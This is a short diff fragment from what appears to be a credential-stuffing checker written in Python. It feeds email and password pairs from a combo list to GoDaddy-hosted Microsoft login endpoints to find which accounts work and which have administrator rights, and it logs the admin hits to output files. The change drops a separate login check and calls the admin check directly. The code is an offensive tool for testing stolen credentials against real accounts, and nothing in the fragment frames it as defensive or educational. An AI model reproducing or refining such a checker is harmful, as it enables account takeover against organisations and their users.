@@ -152,11 +152,9 @@ def Action( combo ):
 			if First_["Valid"]:
 				if "sso.godaddy".__eq__( First_["Type_domain"] ): # check if it's a valid Email Goddady on Microsoft 
 				
-					SECOND_ = REQ_( email , password , CheckGoddadyLogin ).json() # check if it's a valid Login Access Goddady on Microsoft 
-					if SECOND_["Working"]:
-						
-						THIRD_ = REQ_( email , password , AdminFinderGoddady ).json() # check if it's a valid Admin Access Goddady on Microsoft 
-						
+					THIRD_ = REQ_( email , password , AdminFinderGoddady ).json() # check if it's a valid Admin Access Goddady on Microsoft 
+
+					if THIRD_["Working"]:
 						if THIRD_["Admin"]:
 							save_as( "[x] >>>>> Admin GOddady >>>> {}".format( email ) , "{}{}Godaddy__ADMIN.txt".format( i , "Microsoft/Administrator/" ) , combo  )
 						else:
